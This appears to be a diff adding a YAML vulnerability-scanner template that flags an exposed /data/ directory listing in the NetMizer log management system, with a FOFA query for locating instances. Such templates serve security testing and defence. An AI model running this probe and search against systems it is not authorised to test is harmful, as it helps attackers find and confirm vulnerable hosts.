@@ -1,0 +1,24 @@
+id: poc-yaml-netmizer-log-management-system-data-directory-traversal
+info:
+  name: NetMizer 日志管理系统 data 目录遍历漏洞
+  severity: high
+  tags:
+  - 目录遍历
+  finger: NetMizer 日志管理系统
+  fofa: title="NetMizer 日志管理系统"
+requests:
+- method: GET
+  path: /data/
+  expression: 'status_code == 200
+
+    && contains(title,"Index of /data")
+
+    && contains(body,"login/")
+
+    && contains(body,"bin/")
+
+    && contains(body,"Parent Directory")
+
+    '
+variables: {}
+transport: http
